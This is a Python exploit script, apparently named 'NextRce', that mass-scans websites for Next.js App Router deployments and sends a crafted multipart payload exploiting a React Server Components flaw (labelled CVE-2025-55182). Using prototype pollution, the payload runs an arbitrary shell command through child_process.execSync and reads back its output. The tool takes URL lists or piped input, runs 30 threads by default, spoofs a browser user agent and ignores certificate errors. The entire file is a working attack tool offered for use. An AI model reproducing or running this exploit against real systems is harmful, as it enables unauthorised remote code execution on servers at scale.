#!/usr/bin/env python3
import requests
import re
import json
import base64
import argparse
import sys
import urllib3
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

# Disable SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREY = '\033[90m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_banner():
    banner = rf"""
{Colors.CYAN}    _   __          __  ____            
   / | / /__  _  __/ /_/ __ \________   
  /  |/ / _ \| |/_/ __/ /_/ / ___/ _ \  
 / /|  /  __/>  </ /_/ _, _/ /__/  __/  
/_/ |_/\___/_/|_|\__/_/ |_|\___/\___/   
{Colors.RESET}
{Colors.BOLD}   Next.js RSC Exploit Tool (CVE-2025-55182){Colors.RESET}
{Colors.GREY}   Mass Scanner & Pipeline Edition{Colors.RESET}

{Colors.RED}   >> OPERATOR: MITSEC ( x.com/ynsmroztas ){Colors.RESET}
    """
    print(banner)

def extract_url(line):
    """
    Extracts valid URLs from mixed input (e.g., httpx output).
    """
    url_match = re.search(r'(https?://[^\s]+)', line)
    return url_match.group(1) if url_match else None

class NextExploiter:
    def __init__(self, cmd="id", timeout=10, proxy=None, verbose=False):
        self.cmd = cmd
        self.timeout = timeout
        self.verbose = verbose
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "*/*"
        }
        self.proxies = {"http": proxy, "https": proxy} if proxy else None

    def scan_and_exploit(self, target_url):
        try:
            # Phase 1: Detection
            try:
                r = requests.get(target_url, headers=self.headers, verify=False, timeout=self.timeout, proxies=self.proxies)
                html = r.text
                headers = r.headers
            except Exception:
                if self.verbose:
                    print(f"{Colors.GREY}[-] {target_url} : Connection Failed{Colors.RESET}")
                return

            is_nextjs = False
            is_vulnerable_arch = False

            # Header & Path Check
            if "X-Powered-By" in headers and "Next.js" in headers["X-Powered-By"]:
                is_nextjs = True
            if "/_next/" in html:
                is_nextjs = True

            # Architecture Check (App Router vs Pages Router)
            if "__next_f" in html:
                is_nextjs = True
                is_vulnerable_arch = True # App Router Detected (RSC)
            
            if not is_nextjs:
                return # Skip non-Next.js targets silently

            if not is_vulnerable_arch:
                if self.verbose:
                    print(f"{Colors.YELLOW}[SAFE] {target_url} (Pages Router / Legacy){Colors.RESET}")
                return

            # Phase 2: Exploitation
            self.trigger_rce(target_url)

        except Exception as e:
            pass

    def trigger_rce(self, target_url):
        target_ep = urljoin(target_url, "/adfa")
        
        # CVE-2025-55182 Payload Construction
        payload_template = (
            '{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{{\\"then\\":\\"$B1337\\"}}","_response":{{"_prefix":'
            '"var res=process.mainModule.require(\'child_process\').execSync(\'{cmd}\').toString(\'base64\');'
            'throw Object.assign(new Error(\'x\'),{{digest: res}});","_chunks":"$Q2",'
            '"_formData":{{"get":"$1:constructor:constructor"}}}}}}'
        )
        json_payload = payload_template.format(cmd=self.cmd)
        boundary = "----NextRceMitsec"
        
        body = (
            f'--{boundary}\\r\\n'
            'Content-Disposition: form-data; name="0"\\r\\n\\r\\n'
            f'{json_payload}\\r\\n'
            f'--{boundary}\\r\\n'
            'Content-Disposition: form-data; name="1"\\r\\n\\r\\n'
            '"$@0"\\r\\n'
            f'--{boundary}\\r\\n'
            'Content-Disposition: form-data; name="2"\\r\\n\\r\\n'
            '[]\\r\\n'
            f'--{boundary}--\\r\\n'
        )
        headers = {
            'User-Agent': self.headers['User-Agent'],
            'Next-Action': 'x', 
            'Content-Type': f'multipart/form-data; boundary={boundary}'
        }

        try:
            r = requests.post(target_ep, data=body, headers=headers, verify=False, timeout=self.timeout, proxies=self.proxies)
            
            # Extract output from digest
            match = re.search(r'"digest"\s*:\s*"((?:[^"\\\\]|\\\\.)*)"', r.text)
            
            if match:
                raw_b64 = match.group(1)
                clean_b64 = json.loads(f'"{raw_b64}"')
                decoded = base64.b64decode(clean_b64).decode('utf-8', errors='replace').strip()
                
                print(f"{Colors.GREEN}[VULN] {target_url} >>> RCE SUCCESS{Colors.RESET}")
                print(f"{Colors.GREY}       Output: {decoded}{Colors.RESET}")
            elif self.verbose:
                print(f"{Colors.BLUE}[FAIL] {target_url} (App Router Detected but Exploit Failed){Colors.RESET}")

        except Exception:
            pass

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="NextRce - Mass Scanner & Exploiter")
    parser.add_argument("-l", "--list", help="File containing list of URLs")
    parser.add_argument("-u", "--url", help="Single target URL")
    parser.add_argument("-c", "--cmd", default="id", help="Command to execute (default: id)")
    parser.add_argument("-t", "--threads", type=int, default=30, help="Number of threads (default: 30)")
    parser.add_argument("-p", "--proxy", help="HTTP Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show failed attempts and non-vulnerable targets")
    
    args = parser.parse_args()
    
    targets = []

    # Input Handling: Check for Pipe, File, or Single Argument
    if args.url:
        targets.append(args.url)
    elif args.list:
        try:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Error: File not found.{Colors.RESET}")
            sys.exit(1)
    elif not sys.stdin.isatty():
        # Pipeline Mode (stdin)
        print(f"{Colors.CYAN}[*] Reading targets from pipeline (stdin)...{Colors.RESET}")
        for line in sys.stdin:
            clean_url = extract_url(line)
            if clean_url:
                targets.append(clean_url)
    else:
        print(f"{Colors.YELLOW}[!] Usage: cat urls.txt | python3 nextrce.py OR python3 nextrce.py -u <url>{Colors.RESET}")
        sys.exit(1)

    print(f"{Colors.BLUE}[*] Loaded {len(targets)} targets. Starting scan with {args.threads} threads...{Colors.RESET}")
    print(f"{Colors.GREY}[*] Payload Command: {args.cmd}{Colors.RESET}\\n")

    scanner = NextExploiter(cmd=args.cmd, timeout=8, proxy=args.proxy, verbose=args.verbose)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(scanner.scan_and_exploit, targets)

    print(f"\\n{Colors.BLUE}[*] Scan completed.{Colors.RESET}")

if __name__ == "__main__":
    main()
